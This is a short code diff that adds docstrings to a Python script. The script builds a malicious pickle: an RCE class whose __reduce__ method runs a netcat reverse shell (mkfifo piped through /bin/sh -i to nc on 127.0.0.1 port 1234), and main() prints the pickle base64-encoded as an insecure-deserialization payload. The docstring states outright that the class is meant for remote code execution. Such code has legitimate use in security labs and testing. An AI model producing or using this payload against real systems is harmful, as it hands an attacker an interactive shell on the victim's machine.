@@ -13,7 +13,13 @@ import base64
 import os
 
 
+# pylint: disable=too-few-public-methods
 class RCE:
+    """
+    A class meant for remote code execution,
+    including a reverse shell to a hardcoded IP number and port.
+    """
+
     def __reduce__(self):
         cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
                '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
@@ -21,6 +27,11 @@ class RCE:
 
 
 def main():
+    """
+    Serialize the RCE class into a pickle,
+    base64 encode it, and print it.
+    """
+
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
 
